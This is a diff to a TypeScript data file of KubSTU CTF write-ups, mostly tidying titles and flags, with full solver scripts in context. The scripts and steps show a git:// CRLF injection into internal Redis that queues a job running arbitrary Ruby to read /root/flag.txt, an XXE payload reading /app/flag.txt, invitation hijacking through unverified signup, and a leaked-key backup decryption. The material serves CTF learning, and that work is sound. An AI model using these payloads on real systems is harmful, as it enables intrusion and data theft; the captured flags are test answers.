         "code": "#!/usr/bin/env python3\r\n\r\nimport base64\r\nimport io\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nimport requests\r\nfrom Crypto.Cipher import AES\r\n\r\n\r\nTARGET = \"http://212.8.228.176:9000\"\r\nFLAG_TARGET = \"http://212.8.228.176:8888/flag\"\r\nOUTDIR = Path(\"solver_output\")\r\n\r\n\r\ndef pkcs7_unpad(data: bytes) -> bytes:\r\n    if not data:\r\n        raise ValueError(\"empty ciphertext\")\r\n    pad = data[-1]\r\n    if pad < 1 or pad > 16:\r\n        raise ValueError(f\"invalid padding byte: {pad}\")\r\n    if data[-pad:] != bytes([pad]) * pad:\r\n        raise ValueError(\"invalid PKCS#7 padding\")\r\n    return data[:-pad]\r\n\r\n\r\ndef aes_cbc_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:\r\n    cipher = AES.new(key, AES.MODE_CBC, iv)\r\n    return pkcs7_unpad(cipher.decrypt(ciphertext))\r\n\r\n\r\ndef main() -> int:\r\n    session = requests.Session()\r\n    OUTDIR.mkdir(exist_ok=True)\r\n\r\n    print(f\"[+] Downloading backup from {TARGET}/api/backup\")\r\n    backup_resp = session.get(f\"{TARGET}/api/backup\", timeout=20)\r\n    backup_resp.raise_for_status()\r\n\r\n    security = backup_resp.headers.get(\"X-Backup-Security\")\r\n    if not security or \":\" not in security:\r\n        raise RuntimeError(\"missing or malformed X-Backup-Security header\")\r\n\r\n    key_b64, iv_b64 = security.split(\":\", 1)\r\n    key = base64.b64decode(key_b64)\r\n    iv = base64.b64decode(iv_b64)\r\n\r\n    print(\"[+] Extracting outer backup ZIP\")\r\n    outer_zip = zipfile.ZipFile(io.BytesIO(backup_resp.content))\r\n    outer_names = outer_zip.namelist()\r\n    print(f\"[+] Outer archive entries: {outer_names}\")\r\n\r\n    for name in outer_names:\r\n        (OUTDIR / name).write_bytes(outer_zip.read(name))\r\n\r\n    print(\"[+] Decrypting inner archives with leaked AES key and IV\")\r\n    nginx_ui_ct = (OUTDIR / \"nginx-ui.zip\").read_bytes()\r\n    nginx_ct = (OUTDIR / \"nginx.zip\").read_bytes()\r\n\r\n    nginx_ui_pt = aes_cbc_decrypt(nginx_ui_ct, key, iv)\r\n    nginx_pt = aes_cbc_decrypt(nginx_ct, key, iv)\r\n\r\n    (OUTDIR / \"nginx-ui.zip.dec\").write_bytes(nginx_ui_pt)\r\n    (OUTDIR / \"nginx.zip.dec\").write_bytes(nginx_pt)\r\n\r\n    print(\"[+] Extracting decrypted archives\")\r\n    nginx_ui_dir = OUTDIR / \"nginx-ui\"\r\n    nginx_dir = OUTDIR / \"nginx\"\r\n    nginx_ui_dir.mkdir(exist_ok=True)\r\n    nginx_dir.mkdir(exist_ok=True)\r\n\r\n    with zipfile.ZipFile(io.BytesIO(nginx_ui_pt)) as zf:\r\n        zf.extractall(nginx_ui_dir)\r\n        print(f\"[+] nginx-ui archive entries: {zf.namelist()}\")\r\n\r\n    with zipfile.ZipFile(io.BytesIO(nginx_pt)) as zf:\r\n        zf.extractall(nginx_dir)\r\n        print(f\"[+] nginx archive entries: {zf.namelist()}\")\r\n\r\n    conf_candidates = [\r\n        nginx_dir / \"nginx.conf\",\r\n        nginx_dir / \"default.conf\",\r\n        nginx_dir / \"capyflag.conf\",\r\n        nginx_dir / \"conf.d\" / \"capyflag.conf\",\r\n    ]\r\n\r\n    print(\"[+] Relevant Nginx config snippets:\")\r\n    for path in conf_candidates:\r\n        if path.exists():\r\n            print(f\"\\n--- {path} ---\")\r\n            print(path.read_text(errors=\"replace\"))\r\n\r\n    print(f\"\\n[+] Requesting public flag endpoint: {FLAG_TARGET}\")\r\n    flag_resp = session.get(FLAG_TARGET, timeout=10)\r\n    flag_resp.raise_for_status()\r\n    flag = flag_resp.text.strip()\r\n\r\n    print(f\"[+] Flag: {flag}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        raise SystemExit(main())\r\n    except KeyboardInterrupt:\r\n        print(\"\\n[!] Interrupted\", file=sys.stderr)\r\n        raise SystemExit(130)"
       }
     ],
     "terminalOutputs": [],
-    "flag": "```text\nKubSTU(mcp_h4s_n0_4uth_4nd_1_l0v3_1t)",
+    "flag": "KubSTU{mcp_h4s_n0_4uth_4nd_1_l0v3_1t}",
     "lessonsLearned": ""
   },
   {
@@ -1434,27 +1419,27 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "> RepoForge is a self-hosted code collaboration platform built by ForgeStack Inc. where teams manage repositories, run CI/CD pipelines, and coordinate deployments. The platform offers features similar to GitLab — project management, branch tracking, pipeline visualization, and a background job queue for async tasks like repository imports and webhook deliveries.\n>\n> As part of a security assessment, you have been given access to a standard user account on the platform. Your objective is to escalate your privileges and achieve remote code execution on the server.\n>\n> Explore the application carefully. Pay close attention to how the platform handles remote repository imports and what internal services might be accessible from the server. The platform supports multiple import protocols including HTTP, HTTPS, and Git.\n>\n> The flag is stored in /root/flag.txt and can only be retrieved through code execution on the server.\n\n**URL:** `https://501fe2e0-7eb0-499a-ae91-89f6852600c5.labs.hackadvisor.io/login`\n\n**Credentials:** `user@test.com / password123`\n\n---"
       },
       {
-        "title": "Step 1 — Login and Inspect the Import Feature",
+        "title": "Login and Inspect the Import Feature",
         "content": "Setelah login, fitur yang paling menarik ada di halaman **New Project** pada tab **Import Repository**. Form ini melakukan request ke:\n\n\n\ndengan body:\n\n\n\nDeskripsi challenge juga memberi petunjuk kuat bahwa fitur import repository adalah kunci exploit.",
         "code": "POST /api/projects/import\nContent-Type: application/json"
       },
       {
-        "title": "Step 2 — Test `git://` Import Behavior",
+        "title": "Test `git://` Import Behavior",
         "content": "RepoForge mengizinkan URL `git://`, jadi saya coba arahkan import ke service internal:\n\n\n\nProject hasil import menampilkan log berikut:\n\n\n\nIni membuktikan dua hal:\n\n- import `git://` benar-benar membuat koneksi TCP dari server ke host internal\n- karakter CRLF di path bisa menyuntikkan command mentah ke service internal\n\nDengan kata lain, fitur import memberi **raw TCP SSRF / protocol smuggling** ke Redis internal.",
         "code": "git://0.0.0.0:6379/%0D%0ASMEMBERS%20workers%0D%0A"
       },
       {
-        "title": "Step 4 — Confirm Queue Injection",
+        "title": "Confirm Queue Injection",
         "content": "Alih-alih hanya membaca Redis, saya dorong job palsu langsung ke queue:\n\n\n\nPayload ini dikirim sebagai RESP agar Redis memprosesnya dengan benar. Setelah itu, `/api/jobs` menampilkan job gagal dengan `worker_class` yang sama. Artinya:\n\n- queue injection berhasil\n- aplikasi benar-benar memproses job dari Redis",
         "code": "RPUSH queue:default {\"class\":\"ZzzProbeWorker\",\"args\":[\"probe\"],\"jid\":\"<random>\"}"
       },
       {
-        "title": "Step 5 — Understand How Jobs Are Executed",
+        "title": "Understand How Jobs Are Executed",
         "content": "Saya kemudian mencoba beberapa class Ruby bawaan seperti `File`, `Kernel`, dan `String`. Hasil di `/api/jobs/<jid>` membocorkan pola eksekusi worker:\n\n\n\ndan\n\n\n\nDari error ini terlihat worker melakukan sesuatu yang ekuivalen dengan:\n\n\n\nItu berarti class `String` bisa dijadikan gadget eksekusi Ruby arbitrer, karena:\n\n- `String.new` valid dan menghasilkan string kosong\n- string kosong punya method `instance_eval`",
         "code": "{\"worker_class\":\"String\",\"result\":\"undefined method `abc' for \\\"\\\":String\"}"
       },
       {
-        "title": "Step 6 — Turn It Into RCE",
+        "title": "Turn It Into RCE",
         "content": "Saya enqueue job berikut:\n\n\n\nSaat job diproses, aplikasi menjalankan:\n\n\n\ndan hasilnya muncul langsung di endpoint job detail.",
         "code": "{\n  \"class\": \"String\",\n  \"args\": [\"instance_eval\", \"File.read(\\\"/root/flag.txt\\\")\"],\n  \"jid\": \"<random>\"\n}"
       },
@@ -1469,7 +1454,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\nimport json\r\nimport re\r\nimport secrets\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"https://501fe2e0-7eb0-499a-ae91-89f6852600c5.labs.hackadvisor.io\"\r\nEMAIL = \"user@test.com\"\r\nPASSWORD = \"password123\"\r\n\r\n\r\ndef enqueue_job(session, worker_class, args):\r\n    jid = secrets.token_hex(12)\r\n    payload = json.dumps({\"class\": worker_class, \"args\": args, \"jid\": jid})\r\n    redis_cmd = (\r\n        f\"*3\\r\\n\"\r\n        f\"$5\\r\\nRPUSH\\r\\n\"\r\n        f\"$13\\r\\nqueue:default\\r\\n\"\r\n        f\"${len(payload)}\\r\\n{payload}\\r\\n\"\r\n    )\r\n    git_url = \"git://0.0.0.0:6379/%0D%0A\" + urllib.parse.quote(redis_cmd) + \"%0D%0A\"\r\n\r\n    response = session.post(\r\n        f\"{BASE_URL}/api/projects/import\",\r\n        json={\"name\": f\"solve-{jid[:6]}\", \"url\": git_url},\r\n        timeout=15,\r\n    )\r\n    response.raise_for_status()\r\n    return jid\r\n\r\n\r\ndef wait_for_job(session, jid, timeout=15):\r\n    deadline = time.time() + timeout\r\n    while time.time() < deadline:\r\n        response = session.get(f\"{BASE_URL}/api/jobs/{jid}\", timeout=10)\r\n        if response.status_code == 200:\r\n            return response.json()\r\n        time.sleep(0.5)\r\n    raise TimeoutError(f\"job {jid} did not appear in time\")\r\n\r\n\r\ndef main():\r\n    session = requests.Session()\r\n    login = session.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"email\": EMAIL, \"password\": PASSWORD},\r\n        timeout=15,\r\n    )\r\n    login.raise_for_status()\r\n\r\n    jid = enqueue_job(session, \"String\", [\"instance_eval\", 'File.read(\"/root/flag.txt\")'])\r\n    job = wait_for_job(session, jid)\r\n\r\n    result = job.get(\"result\", \"\")\r\n    match = re.search(r\"KubSTU\\{[^}]+\\}\", result)\r\n    if not match:\r\n        raise RuntimeError(f\"flag not found in job result: {result!r}\")\r\n\r\n    print(match.group(0))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
       }
     ],
@@ -1479,7 +1464,7 @@ export const kubsctfWriteups: WriteUp[] = [
   },
   {
     "id": "kubsuctf-web-teamforge",
-    "title": "- KubSTU CTF: TeamForge",
+    "title": "KubSTU CTF: TeamForge",
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
@@ -1497,19 +1482,19 @@ export const kubsctfWriteups: WriteUp[] = [
         "content": "TeamForge adalah platform kolaborasi tim dengan kontrol akses berbasis peran (Owner, Admin, Member). Kita diberikan akun Member biasa (`user@test.com`) dan tujuan kita adalah melakukan privilege escalation ke Admin atau Owner untuk mendapatkan flag yang ada di admin dashboard."
       },
       {
-        "title": "1. Eksplorasi Awal",
+        "title": "Eksplorasi Awal",
         "content": "Pertama, saya login menggunakan kredensial yang diberikan: `user@test.com` / `password123`. Setelah masuk, saya melihat dashboard yang menunjukkan bahwa saya adalah Member di organisasi \"Beta Labs\". \n\nSaya mencoba mengakses beberapa endpoint sensitif seperti `/admin` atau `/org/2/settings`, namun mendapatkan error 404 atau 403 (Forbidden)."
       },
       {
-        "title": "2. Menemukan Kerentanan (Broken Access Control)",
+        "title": "Menemukan Kerentanan (Broken Access Control)",
         "content": "Sambil menelusuri aplikasi, saya mencoba melakukan testing pada IDOR (Insecure Direct Object Reference) atau akses kontrol yang lemah. Saya menemukan bahwa endpoint `/org/1/team` dapat diakses meskipun saya bukan anggota dari organisasi tersebut (Org 1 - Acme Corp)."
       },
       {
-        "title": "3. Kebocoran Informasi (Information Leakage)",
+        "title": "Kebocoran Informasi (Information Leakage)",
         "content": "Di halaman `/org/1/team`, terdapat bagian \"Pending Invitations\". Di sana terdapat komentar HTML yang cukup mencolok: `<!-- Pending Invitations - VULNERABLE: Email addresses are visible! -->`. \n\nHalaman tersebut menunjukkan bahwa ada satu undangan tertunda untuk email `victoria.chase@acme.com` dengan peran sebagai **Owner**."
       },
       {
-        "title": "4. Eksploitasi (Invitation Hijacking)",
+        "title": "Eksploitasi (Invitation Hijacking)",
         "content": "Karena sistem pendaftaran tidak memerlukan verifikasi email (\"No verification required - your account will be active immediately!\"), saya memanfaatkan informasi ini dengan cara:\n1. Mendaftar akun baru menggunakan email `victoria.chase@acme.com`.\n2. Setelah mendaftar dan login, saya melihat notifikasi di dashboard bahwa saya memiliki undangan tertunda untuk bergabung dengan \"Acme Corp\" sebagai Owner.\n3. Saya menuju halaman `/invitations` dan menerima undangan tersebut."
       },
       {
@@ -1518,7 +1503,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "content": "",
         "code": "import requests\r\n\r\nBASE_URL = \"https://4c1ab429-fd50-4645-987d-c28eef4349b2.labs.hackadvisor.io\"\r\nsession = requests.Session()\r\n\r\ndef login(email, password):\r\n    url = f\"{BASE_URL}/login\"\r\n    data = {\"email\": email, \"password\": password}\r\n    response = session.post(url, data=data, allow_redirects=True)\r\n    return response\r\n\r\ndef get_dashboard():\r\n    url = f\"{BASE_URL}/dashboard\"\r\n    response = session.get(url)\r\n    return response\r\n\r\ndef get_path(path):\r\n    url = f\"{BASE_URL}{path}\"\r\n    response = session.get(url)\r\n    return response\r\n\r\ndef post_invite(org_id, email, role):\r\n    url = f\"{BASE_URL}/org/{org_id}/invite\"\r\n    data = {\"email\": email, \"role\": role}\r\n    response = session.post(url, data=data)\r\n    return response\r\n\r\ndef register(username, email, password):\r\n    url = f\"{BASE_URL}/register\"\r\n    data = {\"username\": username, \"email\": email, \"password\": password}\r\n    response = session.post(url, data=data, allow_redirects=True)\r\n    return response\r\n\r\ndef accept_invitation(invite_id):\r\n    url = f\"{BASE_URL}/invitations/{invite_id}/accept\"\r\n    response = session.post(url, allow_redirects=True)\r\n    return response\r\n\r\nif __name__ == \"__main__\":\r\n    resp = login(\"victoria.chase@acme.com\", \"password123\")\r\n    r_team = get_path(\"/org/1/team\")\r\n    print(r_team.text)"
       }
     ],
@@ -1527,8 +1512,8 @@ export const kubsctfWriteups: WriteUp[] = [
     "lessonsLearned": ""
   },
   {
-    "id": "kubsuctf-web--",
-    "title": "- Библиотека Капибара-Сити",
+    "id": "kubsuctf-web-biblioteka-kapibara-siti",
+    "title": "Библиотека Капибара-Сити",
     "category": "Web",
     "difficulty": "Medium",
     "points": 0,
@@ -1556,7 +1541,7 @@ export const kubsctfWriteups: WriteUp[] = [
       },
       {
         "title": "Solver Script",
-        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "content": "",
         "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\nimport sys\r\n\r\nimport requests\r\n\r\n\r\nDEFAULT_TARGET = \"http://31.129.105.124\"\r\nDEFAULT_FILE = \"/app/flag.txt\"\r\n\r\n\r\ndef build_payload(file_path: str) -> str:\r\n    return f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<!DOCTYPE book [\r\n  <!ENTITY xxe SYSTEM \"file://{file_path}\">\r\n]>\r\n<book>\r\n  <id>&xxe;</id>\r\n</book>\"\"\"\r\n\r\n\r\ndef extract_result(body: str) -> str:\r\n    match = re.search(r\"Результат поиска:\\s*(.*)\", body, re.DOTALL)\r\n    if match:\r\n        return match.group(1).strip()\r\n    return body.strip()\r\n\r\n\r\ndef main() -> int:\r\n    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET\r\n    file_path = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_FILE\r\n\r\n    payload = build_payload(file_path)\r\n\r\n    response = requests.post(\r\n        f\"{target.rstrip('/')}/check_book\",\r\n        data=payload.encode(),\r\n        headers={\"Content-Type\": \"application/xml\"},\r\n        timeout=10,\r\n    )\r\n    response.raise_for_status()\r\n\r\n    print(extract_result(response.text))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
       }
     ],
